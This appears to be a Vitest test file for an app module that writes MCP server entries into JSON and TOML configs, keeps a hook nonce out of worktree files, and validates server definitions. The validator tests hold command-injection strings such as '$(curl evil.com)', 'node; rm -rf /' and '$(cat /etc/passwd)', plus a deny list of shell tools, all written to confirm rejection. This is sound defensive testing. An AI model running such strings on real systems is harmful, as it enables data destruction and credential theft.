import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fsp from 'fs/promises';
import * as path from 'path';
import * as os from 'os';

vi.mock('electron', () => ({
  app: { getPath: () => '/tmp/clubhouse-test' },
}));

const mockIsMcpEnabled = vi.fn();
vi.mock('../mcp-settings', () => ({
  isMcpEnabled: () => mockIsMcpEnabled(),
}));

vi.mock('../log-service', () => ({
  appLog: vi.fn(),
}));

vi.mock('fs', async (importOriginal) => {
  const actual = await importOriginal<typeof import('fs')>();
  return {
    ...actual,
    existsSync: vi.fn(() => true),
  };
});

vi.mock('../fs-utils', () => ({
  pathExists: vi.fn(async (p: string) => {
    try {
      await fsp.access(p);
      return true;
    } catch {
      return false;
    }
  }),
}));

import { injectClubhouseMcp, injectTemplateMcpServers, isClubhouseMcpEntry, stripClubhouseMcp, stripClubhouseMcpToml, buildClubhouseMcpDef, validateMcpServerDef, scrubClubhouseNonce, scrubClubhouseNonceToml } from './injection';

describe('MCP Injection', () => {
  let tmpDir: string;

  beforeEach(async () => {
    tmpDir = await fsp.mkdtemp(path.join(os.tmpdir(), 'mcp-injection-test-'));
  });

  afterEach(async () => {
    await fsp.rm(tmpDir, { recursive: true, force: true });
  });

  describe('injectClubhouseMcp', () => {
    it('does nothing when feature is disabled', async () => {
      mockIsMcpEnabled.mockReturnValue(false);
      await injectClubhouseMcp(tmpDir, 'agent-1', 12345);
      // .mcp.json should not exist
      await expect(fsp.access(path.join(tmpDir, '.mcp.json'))).rejects.toThrow();
    });

    it('creates .mcp.json with clubhouse entry when feature is enabled', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      await injectClubhouseMcp(tmpDir, 'agent-1', 12345);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers.clubhouse).toBeDefined();
      expect(content.mcpServers.clubhouse.command).toBe('node');
      // Port and agent ID only as fallbacks: the agent's own env wins, and
      // quick agents sharing this worktree keep their own identity.
      expect(content.mcpServers.clubhouse.env).toEqual({ CLUBHOUSE_MCP_FALLBACK_PORT: '12345', CLUBHOUSE_MCP_FALLBACK_AGENT_ID: 'agent-1' });
      // The nonce is named, never stored (#2222).
      expect(content.mcpServers.clubhouse.env).not.toHaveProperty('CLUBHOUSE_HOOK_NONCE');
      expect(content.mcpServers.clubhouse.env_vars).toEqual(['CLUBHOUSE_AGENT_ID', 'CLUBHOUSE_HOOK_NONCE', 'CLUBHOUSE_MCP_PORT']);
    });

    describe('keeps the nonce out of the worktree (#2222)', () => {
      const NONCE = 'b1f0c3a4-5e6d-4f70-8a9b-0c1d2e3f4a5b';

      /** Every file under dir, recursively, as text. */
      async function allText(dir: string): Promise<string> {
        const entries = await fsp.readdir(dir, { withFileTypes: true, recursive: true });
        const texts = await Promise.all(entries.filter((e) => e.isFile()).map((e) => fsp.readFile(path.join(e.parentPath, e.name), 'utf-8')));
        return texts.join('\n');
      }

      it('a sibling reading the JSON worktree config finds no nonce field', async () => {
        mockIsMcpEnabled.mockReturnValue(true);
        await injectClubhouseMcp(tmpDir, 'agent-1', 12345);
        const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
        expect(JSON.stringify(content)).not.toMatch(/CLUBHOUSE_HOOK_NONCE"\s*:/);
      });

      it('a sibling reading the TOML worktree config finds no nonce', async () => {
        mockIsMcpEnabled.mockReturnValue(true);
        await injectClubhouseMcp(tmpDir, 'agent-1', 12345, { configDir: '.codex', mcpConfigFile: '.codex/config.toml', settingsFormat: 'toml' });
        const content = await fsp.readFile(path.join(tmpDir, '.codex', 'config.toml'), 'utf-8');
        expect(content).not.toMatch(/CLUBHOUSE_HOOK_NONCE\s*=/);
        expect(content).toContain('env_vars = ["CLUBHOUSE_AGENT_ID", "CLUBHOUSE_HOOK_NONCE", "CLUBHOUSE_MCP_PORT"]');
      });

      it('migrates a stale nonce away from .mcp.json on the next injection', async () => {
        mockIsMcpEnabled.mockReturnValue(true);
        const bridge = { command: 'node', args: ['/x/clubhouse-mcp-bridge.js'], env: { CLUBHOUSE_MCP_PORT: '1', CLUBHOUSE_AGENT_ID: 'agent-1', CLUBHOUSE_HOOK_NONCE: NONCE } };
        await fsp.writeFile(path.join(tmpDir, '.mcp.json'), JSON.stringify({
          mcpServers: { clubhouse: bridge, 'clubhouse-old': bridge, user: { command: 'u', env: { KEEP: '1' } } },
        }), 'utf-8');

        await injectClubhouseMcp(tmpDir, 'agent-1', 12345);

        expect(await allText(tmpDir)).not.toContain(NONCE);
        const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
        expect(content.mcpServers.user).toEqual({ command: 'u', env: { KEEP: '1' } });
        // A bridge entry's stored identity would shadow the agent's own env.
        expect(content.mcpServers['clubhouse-old'].env).toEqual({});
      });

      it('migrates a stale nonce away from the Codex TOML on the next injection', async () => {
        mockIsMcpEnabled.mockReturnValue(true);
        await fsp.mkdir(path.join(tmpDir, '.codex'), { recursive: true });
        await fsp.writeFile(path.join(tmpDir, '.codex', 'config.toml'), [
          'model = "gpt"',
          '',
          '[mcp_servers.clubhouse]',
          'command = "node"',
          '',
          '[mcp_servers.clubhouse.env]',
          `CLUBHOUSE_HOOK_NONCE = "${NONCE}"`,
          '',
          '[mcp_servers.copy.env]',
          `CLUBHOUSE_HOOK_NONCE = "${NONCE}"`,
          'KEEP = "1"',
          '',
        ].join('\n'), 'utf-8');

        await injectClubhouseMcp(tmpDir, 'agent-1', 12345, { configDir: '.codex', mcpConfigFile: '.codex/config.toml', settingsFormat: 'toml' });

        const content = await fsp.readFile(path.join(tmpDir, '.codex', 'config.toml'), 'utf-8');
        expect(content).not.toContain(NONCE);
        expect(content).toContain('model = "gpt"');
        expect(content).toContain('KEEP = "1"');
      });
    });

    it('preserves existing MCP servers', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      const existing = {
        mcpServers: {
          'my-server': { command: 'my-cmd', args: ['--flag'] },
        },
      };
      await fsp.writeFile(path.join(tmpDir, '.mcp.json'), JSON.stringify(existing), 'utf-8');

      await injectClubhouseMcp(tmpDir, 'agent-1', 12345);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers['my-server']).toBeDefined();
      expect(content.mcpServers.clubhouse).toBeDefined();
    });

    it('overwrites existing clubhouse entry', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      const existing = {
        mcpServers: {
          clubhouse: { command: 'old', args: [] },
        },
      };
      await fsp.writeFile(path.join(tmpDir, '.mcp.json'), JSON.stringify(existing), 'utf-8');

      await injectClubhouseMcp(tmpDir, 'agent-1', 12345);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers.clubhouse.command).toBe('node');
    });

    it('uses custom conventions for config file path', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      await injectClubhouseMcp(tmpDir, 'agent-1', 12345, {
        mcpConfigFile: 'custom-mcp.json',
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, 'custom-mcp.json'), 'utf-8'));
      expect(content.mcpServers.clubhouse).toBeDefined();
    });

    it('handles malformed existing JSON gracefully', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      await fsp.writeFile(path.join(tmpDir, '.mcp.json'), 'not valid json!!!', 'utf-8');

      await injectClubhouseMcp(tmpDir, 'agent-1', 12345);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers.clubhouse).toBeDefined();
    });

    it('serializes concurrent injections (no clobbering)', async () => {
      mockIsMcpEnabled.mockReturnValue(true);

      // Run 3 injections concurrently
      await Promise.all([
        injectClubhouseMcp(tmpDir, 'agent-A', 10001),
        injectClubhouseMcp(tmpDir, 'agent-B', 10002),
        injectClubhouseMcp(tmpDir, 'agent-C', 10003),
      ]);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      // Because of the mutex, the last writer wins, and only one entry
      // should exist — but the file should be valid JSON, not corrupted
      expect(content.mcpServers).toBeDefined();
      expect(content.mcpServers.clubhouse).toBeDefined();
      // The clubhouse entry should be valid (from the last injection in serial order)
      expect(content.mcpServers.clubhouse.command).toBe('node');
    });

    it('serializes mixed inject + template calls via shared mutex', async () => {
      mockIsMcpEnabled.mockReturnValue(true);

      // Fire both injectClubhouseMcp and injectTemplateMcpServers concurrently.
      // Without a proper mutex, file corruption can occur.
      await Promise.all([
        injectClubhouseMcp(tmpDir, 'agent-A', 10001),
        injectTemplateMcpServers(tmpDir, { 'plugin-server': { command: 'python', args: ['serve.py'] } }),
        injectClubhouseMcp(tmpDir, 'agent-B', 10002),
      ]);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers).toBeDefined();
      // Both clubhouse and plugin-server entries should exist (last clubhouse wins)
      expect(content.mcpServers.clubhouse).toBeDefined();
      expect(content.mcpServers.clubhouse.command).toBe('node');
      expect(content.mcpServers['plugin-server']).toBeDefined();
      expect(content.mcpServers['plugin-server'].command).toBe('python');
    });

    it('creates parent directory if it does not exist', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      const nestedDir = path.join(tmpDir, 'nested', 'deep');

      await injectClubhouseMcp(nestedDir, 'agent-1', 12345, {
        mcpConfigFile: '.mcp.json',
      });

      // Should NOT throw — directory was created
      const content = JSON.parse(await fsp.readFile(path.join(nestedDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers.clubhouse).toBeDefined();
    });

    it('injects TOML MCP config for TOML config format (Codex CLI)', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      const codexDir = path.join(tmpDir, '.codex');
      await fsp.mkdir(codexDir, { recursive: true });

      await injectClubhouseMcp(tmpDir, 'agent-1', 12345, {
        configDir: '.codex',
        mcpConfigFile: '.codex/config.toml',
        settingsFormat: 'toml',
      });

      const content = await fsp.readFile(path.join(tmpDir, '.codex', 'config.toml'), 'utf-8');
      expect(content).toContain('[mcp_servers.clubhouse]');
      expect(content).toContain('command = "node"');
      expect(content).toContain('CLUBHOUSE_MCP_FALLBACK_PORT = "12345"');
      expect(content).toContain('CLUBHOUSE_MCP_FALLBACK_AGENT_ID = "agent-1"');
      expect(content).not.toMatch(/^CLUBHOUSE_AGENT_ID =/m);
      expect(content).not.toContain('CLUBHOUSE_HOOK_NONCE =');
    });

    it('preserves existing TOML content when injecting', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      const codexDir = path.join(tmpDir, '.codex');
      await fsp.mkdir(codexDir, { recursive: true });
      await fsp.writeFile(
        path.join(codexDir, 'config.toml'),
        '[mcp_servers.existing]\ncommand = "other"\n',
        'utf-8',
      );

      await injectClubhouseMcp(tmpDir, 'agent-1', 12345, {
        configDir: '.codex',
        mcpConfigFile: '.codex/config.toml',
        settingsFormat: 'toml',
      });

      const content = await fsp.readFile(path.join(codexDir, 'config.toml'), 'utf-8');
      expect(content).toContain('[mcp_servers.existing]');
      expect(content).toContain('[mcp_servers.clubhouse]');
    });

    it('replaces existing clubhouse section in TOML', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      const codexDir = path.join(tmpDir, '.codex');
      await fsp.mkdir(codexDir, { recursive: true });
      await fsp.writeFile(
        path.join(codexDir, 'config.toml'),
        '[mcp_servers.clubhouse]\ncommand = "old"\n',
        'utf-8',
      );

      await injectClubhouseMcp(tmpDir, 'agent-1', 12345, {
        configDir: '.codex',
        mcpConfigFile: '.codex/config.toml',
        settingsFormat: 'toml',
      });

      const content = await fsp.readFile(path.join(codexDir, 'config.toml'), 'utf-8');
      expect(content).not.toContain('command = "old"');
      expect(content).toContain('command = "node"');
    });

    it('still injects for JSON config format', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      await injectClubhouseMcp(tmpDir, 'agent-1', 12345, {
        configDir: '.claude',
        mcpConfigFile: '.mcp.json',
        settingsFormat: 'json',
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers.clubhouse).toBeDefined();
    });

    it('no temp files left behind after injection', async () => {
      mockIsMcpEnabled.mockReturnValue(true);
      await injectClubhouseMcp(tmpDir, 'agent-1', 12345);

      const files = await fsp.readdir(tmpDir);
      const tmpFiles = files.filter(f => f.includes('.tmp.'));
      expect(tmpFiles).toHaveLength(0);
    });
  });

  describe('isClubhouseMcpEntry', () => {
    it('detects clubhouse bridge entries', () => {
      expect(isClubhouseMcpEntry({
        command: 'node',
        args: ['/path/to/clubhouse-mcp-bridge.js'],
      })).toBe(true);
    });

    it('rejects non-clubhouse entries', () => {
      expect(isClubhouseMcpEntry({
        command: 'node',
        args: ['/path/to/other-server.js'],
      })).toBe(false);
    });

    it('rejects non-node entries', () => {
      expect(isClubhouseMcpEntry({
        command: 'python',
        args: ['clubhouse-mcp-bridge.js'],
      })).toBe(false);
    });

    it('handles null/undefined', () => {
      expect(isClubhouseMcpEntry(null)).toBe(false);
      expect(isClubhouseMcpEntry(undefined)).toBe(false);
    });
  });

  describe('stripClubhouseMcp', () => {
    it('removes clubhouse entry from config', () => {
      const config = {
        mcpServers: {
          clubhouse: { command: 'node', args: ['clubhouse-mcp-bridge.js'] },
          'my-server': { command: 'my-cmd', args: [] },
        },
      };
      const result = stripClubhouseMcp(config);
      expect(result.mcpServers).toBeDefined();
      expect((result.mcpServers as Record<string, unknown>)['clubhouse']).toBeUndefined();
      expect((result.mcpServers as Record<string, unknown>)['my-server']).toBeDefined();
    });

    it('returns config unchanged when no mcpServers', () => {
      const config = { someOther: 'value' };
      expect(stripClubhouseMcp(config)).toEqual(config);
    });
  });

  describe('stripClubhouseMcpToml', () => {
    it('removes clubhouse section from TOML', () => {
      const toml = [
        '[mcp_servers.clubhouse]',
        'command = "node"',
        '',
        '[mcp_servers.clubhouse.env]',
        'KEY = "VALUE"',
        '',
        '[other_section]',
        'key = "value"',
      ].join('\n');
      const result = stripClubhouseMcpToml(toml);
      expect(result).not.toContain('[mcp_servers.clubhouse]');
      expect(result).not.toContain('KEY = "VALUE"');
      expect(result).toContain('[other_section]');
    });

    it('preserves other MCP servers', () => {
      const toml = [
        '[mcp_servers.clubhouse]',
        'command = "node"',
        '',
        '[mcp_servers.other]',
        'command = "python"',
      ].join('\n');
      const result = stripClubhouseMcpToml(toml);
      expect(result).not.toContain('[mcp_servers.clubhouse]');
      expect(result).toContain('[mcp_servers.other]');
    });

    it('handles TOML without clubhouse section', () => {
      const toml = '[mcp_servers.other]\ncommand = "node"';
      expect(stripClubhouseMcpToml(toml)).toBe(toml);
    });
  });

  describe('buildClubhouseMcpDef', () => {
    it('returns a valid MCP server definition with type stdio', () => {
      const def = buildClubhouseMcpDef(12345, 'agent-1');
      expect(def.type).toBe('stdio');
      expect(def.command).toBe('node');
      expect(def.args).toBeDefined();
      expect(def.args!.length).toBe(1);
      expect(def.args![0]).toContain('clubhouse-mcp-bridge');
      expect(def.env).toEqual({
        CLUBHOUSE_MCP_FALLBACK_PORT: '12345',
        CLUBHOUSE_MCP_FALLBACK_AGENT_ID: 'agent-1',
      });
      // No nonce in the definition, so none in argv or the spawn log (#2222).
      expect(def.env_vars).toEqual(['CLUBHOUSE_AGENT_ID', 'CLUBHOUSE_HOOK_NONCE', 'CLUBHOUSE_MCP_PORT']);
    });
  });

  describe('scrubClubhouseNonce', () => {
    it('drops the nonce from every server env in both key styles', () => {
      const cfg = {
        mcpServers: { a: { command: 'x', env: { CLUBHOUSE_HOOK_NONCE: 'n', K: 'v' } }, b: { url: 'http://h' } },
        mcp_servers: { c: { command: 'y', env: { CLUBHOUSE_HOOK_NONCE: 'n' } } },
      };
      expect(scrubClubhouseNonce(cfg)).toEqual({
        mcpServers: { a: { command: 'x', env: { K: 'v' } }, b: { url: 'http://h' } },
        mcp_servers: { c: { command: 'y', env: {} } },
      });
    });

    it('keeps references to the nonce: a placeholder is the user\'s, not a stored value', () => {
      const cfg = {
        mcpServers: {
          a: { command: 'x', env: { CLUBHOUSE_HOOK_NONCE: '${CLUBHOUSE_HOOK_NONCE}' } },
          b: { command: 'y', env: { CLUBHOUSE_HOOK_NONCE: '%CLUBHOUSE_HOOK_NONCE%' } },
          c: { command: 'z', env: { CLUBHOUSE_HOOK_NONCE: '$CLUBHOUSE_HOOK_NONCE' } },
        },
      };
      expect(scrubClubhouseNonce(structuredClone(cfg))).toEqual(cfg);
    });

    it('drops a bridge entry\'s stored agent ID and port, but not another server\'s', () => {
      const cfg = {
        mcpServers: {
          bridge: { command: 'node', args: ['/a/clubhouse-mcp-bridge.js'], env: { CLUBHOUSE_AGENT_ID: 'a1', CLUBHOUSE_MCP_PORT: '1', CLUBHOUSE_MCP_FALLBACK_PORT: '1' } },
          other: { command: 'x', env: { CLUBHOUSE_AGENT_ID: 'mine' } },
        },
      };
      expect(scrubClubhouseNonce(cfg).mcpServers).toEqual({
        bridge: { command: 'node', args: ['/a/clubhouse-mcp-bridge.js'], env: { CLUBHOUSE_MCP_FALLBACK_PORT: '1' } },
        other: { command: 'x', env: { CLUBHOUSE_AGENT_ID: 'mine' } },
      });
    });

    it('drops nonce pairs from TOML inline tables and keeps references', () => {
      const toml = [
        'env = { CLUBHOUSE_HOOK_NONCE = "n1", KEEP = "1" }',
        'env = { KEEP = "2", CLUBHOUSE_HOOK_NONCE = "n2" }',
        'env = { A = "3", CLUBHOUSE_HOOK_NONCE = "n3", B = "4" }',
        'env = { CLUBHOUSE_HOOK_NONCE = "n4" }',
        'env = { CLUBHOUSE_HOOK_NONCE = "${CLUBHOUSE_HOOK_NONCE}" }',
        'CLUBHOUSE_HOOK_NONCE = "%CLUBHOUSE_HOOK_NONCE%"',
      ].join('\n');
      expect(scrubClubhouseNonceToml(toml).split('\n')).toEqual([
        'env = { KEEP = "1" }',
        'env = { KEEP = "2" }',
        'env = { A = "3", B = "4" }',
        'env = {  }',
        'env = { CLUBHOUSE_HOOK_NONCE = "${CLUBHOUSE_HOOK_NONCE}" }',
        'CLUBHOUSE_HOOK_NONCE = "%CLUBHOUSE_HOOK_NONCE%"',
      ]);
    });

    it('drops nonce lines from TOML in table and dotted form', () => {
      const toml = [
        '[mcp_servers.clubhouse.env]',
        'CLUBHOUSE_HOOK_NONCE = "n1"',
        'KEEP = "1"',
        '[mcp_servers.x]',
        'env.CLUBHOUSE_HOOK_NONCE = "n2"',
        'mcp_servers.y.env.CLUBHOUSE_HOOK_NONCE = "n3"',
        'env_vars = ["CLUBHOUSE_HOOK_NONCE"]',
      ].join('\n');
      const out = scrubClubhouseNonceToml(toml);
      expect(out).not.toMatch(/n1|n2|n3/);
      expect(out).toContain('KEEP = "1"');
      expect(out).toContain('env_vars = ["CLUBHOUSE_HOOK_NONCE"]');
    });
  });

  describe('injectTemplateMcpServers', () => {
    it('creates .mcp.json with template servers when no file exists', async () => {
      const servers = {
        'my-plugin-server': { command: 'python', args: ['server.py'] },
      };
      await injectTemplateMcpServers(tmpDir, servers);

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers['my-plugin-server']).toEqual({ command: 'python', args: ['server.py'] });
    });

    it('preserves existing MCP servers when merging', async () => {
      const existing = {
        mcpServers: {
          'existing-server': { command: 'node', args: ['existing.js'] },
        },
      };
      await fsp.writeFile(path.join(tmpDir, '.mcp.json'), JSON.stringify(existing), 'utf-8');

      await injectTemplateMcpServers(tmpDir, {
        'new-server': { command: 'python', args: ['new.py'] },
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers['existing-server']).toBeDefined();
      expect(content.mcpServers['new-server']).toBeDefined();
    });

    it('overwrites server entries with the same name', async () => {
      const existing = {
        mcpServers: {
          'my-server': { command: 'old', args: [] },
        },
      };
      await fsp.writeFile(path.join(tmpDir, '.mcp.json'), JSON.stringify(existing), 'utf-8');

      await injectTemplateMcpServers(tmpDir, {
        'my-server': { command: 'new', args: ['--updated'] },
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers['my-server']).toEqual({ command: 'new', args: ['--updated'] });
    });

    it('injects multiple servers at once', async () => {
      await injectTemplateMcpServers(tmpDir, {
        'server-a': { command: 'a' },
        'server-b': { command: 'b' },
        'server-c': { command: 'c' },
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(Object.keys(content.mcpServers)).toHaveLength(3);
      expect(content.mcpServers['server-a'].command).toBe('a');
      expect(content.mcpServers['server-b'].command).toBe('b');
      expect(content.mcpServers['server-c'].command).toBe('c');
    });

    it('handles malformed existing JSON gracefully', async () => {
      await fsp.writeFile(path.join(tmpDir, '.mcp.json'), 'not json!!!', 'utf-8');

      await injectTemplateMcpServers(tmpDir, {
        'my-server': { command: 'node', args: [] },
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers['my-server']).toBeDefined();
    });

    it('creates parent directory if it does not exist', async () => {
      const nestedDir = path.join(tmpDir, 'nested', 'deep');

      await injectTemplateMcpServers(nestedDir, {
        'my-server': { command: 'node' },
      });

      const content = JSON.parse(await fsp.readFile(path.join(nestedDir, '.mcp.json'), 'utf-8'));
      expect(content.mcpServers['my-server']).toBeDefined();
    });

    it('uses custom conventions for config file path', async () => {
      await injectTemplateMcpServers(tmpDir, { 'my-server': { command: 'node' } }, {
        mcpConfigFile: 'custom-mcp.json',
      });

      const content = JSON.parse(await fsp.readFile(path.join(tmpDir, 'custom-mcp.json'), 'utf-8'));
      expect(content.mcpServers['my-server']).toBeDefined();
    });

    it('no temp files left behind after injection', async () => {
      await injectTemplateMcpServers(tmpDir, { 'my-server': { command: 'node' } });

      const files = await fsp.readdir(tmpDir);
      const tmpFiles = files.filter(f => f.includes('.tmp.'));
      expect(tmpFiles).toHaveLength(0);
    });

    it('rejects dangerous commands like bash', async () => {
      await expect(
        injectTemplateMcpServers(tmpDir, {
          'evil': { command: 'bash', args: ['-c', 'echo pwned'] },
        }),
      ).rejects.toThrow(/not allowed/);
    });

    it('rejects shell metacharacters in args', async () => {
      await expect(
        injectTemplateMcpServers(tmpDir, {
          'evil': { command: 'node', args: ['$(curl evil.com)'] },
        }),
      ).rejects.toThrow(/shell metacharacters/);
    });

    it('rejects unknown properties in server definition', async () => {
      await expect(
        injectTemplateMcpServers(tmpDir, {
          'evil': { command: 'node', malicious: true } as Record<string, unknown>,
        }),
      ).rejects.toThrow(/unknown property/);
    });
  });

  describe('validateMcpServerDef', () => {
    it('accepts valid server definition with command, args, env', () => {
      expect(() =>
        validateMcpServerDef('test', {
          command: 'node',
          args: ['server.js', '--port', '3000'],
          env: { NODE_ENV: 'production' },
        }),
      ).not.toThrow();
    });

    it('accepts valid server definition with url and type', () => {
      expect(() =>
        validateMcpServerDef('test', {
          type: 'sse',
          url: 'http://localhost:3000',
        }),
      ).not.toThrow();
    });

    it('rejects null definition', () => {
      expect(() => validateMcpServerDef('test', null)).toThrow(/must be a non-null object/);
    });

    it('rejects array definition', () => {
      expect(() => validateMcpServerDef('test', [1, 2])).toThrow(/must be a non-null object/);
    });

    it('rejects dangerous shell commands', () => {
      for (const cmd of ['bash', 'sh', 'cmd', 'powershell', 'curl', 'eval']) {
        expect(() => validateMcpServerDef('test', { command: cmd })).toThrow(/not allowed/);
      }
    });

    it('rejects dangerous commands in paths', () => {
      expect(() => validateMcpServerDef('test', { command: '/usr/bin/bash' })).toThrow(/not allowed/);
    });

    it('rejects shell metacharacters in command', () => {
      expect(() => validateMcpServerDef('test', { command: 'node; rm -rf /' })).toThrow(/shell metacharacters/);
    });

    it('rejects shell metacharacters in args', () => {
      expect(() =>
        validateMcpServerDef('test', { command: 'node', args: ['`whoami`'] }),
      ).toThrow(/shell metacharacters/);
    });

    it('rejects backtick subshell in args', () => {
      expect(() =>
        validateMcpServerDef('test', { command: 'node', args: ['$(cat /etc/passwd)'] }),
      ).toThrow(/shell metacharacters/);
    });

    it('rejects non-string args entries', () => {
      expect(() =>
        validateMcpServerDef('test', { command: 'node', args: [123] }),
      ).toThrow(/must be a string/);
    });

    it('rejects non-string env values', () => {
      expect(() =>
        validateMcpServerDef('test', { command: 'node', env: { FOO: 123 } }),
      ).toThrow(/must be a string/);
    });

    it('rejects unknown properties', () => {
      expect(() =>
        validateMcpServerDef('test', { command: 'node', shell: true }),
      ).toThrow(/unknown property "shell"/);
    });
  });
});
